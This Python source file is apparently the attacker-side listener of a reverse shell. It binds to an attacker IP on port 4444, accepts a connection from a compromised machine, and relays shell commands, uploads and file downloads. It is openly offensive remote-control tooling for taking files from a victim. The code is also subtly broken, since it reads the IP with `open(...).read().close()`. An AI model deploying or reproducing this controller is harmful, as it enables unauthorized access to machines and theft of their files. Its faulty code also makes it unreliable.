import socket, json, os

ATTACKER_IP = open("ip.txt").read().close()

def robust_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def robust_recv():
	data = ''
	while True:
		try:
			data += target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def upload(file):
	with open(file, "rb") as f:
		target.send(f.read())

def download(file):
	with open(file, "wb") as f:
		target.settimeout(1)
		chunk = target.recv(1024)
		while chunk:
			f.write(chunk)
			try:
				chunk = target.recv(1024)
			except socket.timeout:
				break
		target.settimeout(None)

def target_communicate():
	while True:
		command = input(f"* Shell~{ip}: ")
		robust_send(command)
		if command == "quit":
			break
		elif command.startswith("cd "):
			pass
		elif command == "clear":
			os.system("clear")
		elif command.startswith("download "):
			download(command[9:])
		elif command.startswith("upload "):
			upload(command[7:])
		else:
			result = robust_recv()
			print(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((ATTACKER_IP, 4444))

print("[+] Listening for incoming connections...")

s.listen(5)
target, ip = s.accept()

print(f"[+] Target connected from {ip}!")

target_communicate()